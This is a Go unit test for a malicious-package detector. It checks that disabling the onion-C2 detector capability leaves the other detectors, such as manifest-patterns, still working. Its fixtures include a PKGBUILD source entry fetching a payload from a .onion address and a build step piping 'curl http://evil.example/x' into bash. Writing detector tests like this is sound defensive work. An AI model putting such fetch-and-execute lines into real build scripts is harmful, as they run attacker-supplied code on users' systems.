package detect

import "testing"

func TestCapabilitiesShortCircuit(t *testing.T) {
	onion := "source=('http://abcdefghij234567.onion/payload.tar.gz')\n"

	// Default (nil Capabilities): the .onion C2 detector fires → malicious.
	base := &PackageContext{Name: "pkg", PkgbuildContent: onion}
	if !IsMalicious(Detect(base)) {
		t.Fatal("expected malicious with onion-c2 enabled (default)")
	}

	// Disabling onion-c2 short-circuits that detector → no evidence.
	off := &PackageContext{
		Name:            "pkg",
		PkgbuildContent: onion,
		Capabilities:    map[string]bool{CapOnionC2: false},
	}
	if IsMalicious(Detect(off)) {
		t.Fatal("expected NOT malicious after disabling onion-c2")
	}

	// Other detectors are unaffected: a curl|bash payload still mints via
	// manifest-patterns even though onion-c2 is off.
	other := &PackageContext{
		Name:            "pkg",
		PkgbuildContent: "build() { curl http://evil.example/x | bash; }\n",
		Capabilities:    map[string]bool{CapOnionC2: false},
	}
	if !IsMalicious(Detect(other)) {
		t.Fatal("manifest-patterns (curl|bash) should still fire")
	}

	// Disabling manifest-patterns too short-circuits the curl|bash detector.
	other.Capabilities[CapManifestPatterns] = false
	other.Capabilities[CapShellObfuscation] = false
	if IsMalicious(Detect(other)) {
		t.Fatal("expected NOT malicious after disabling manifest-patterns + shell")
	}
}
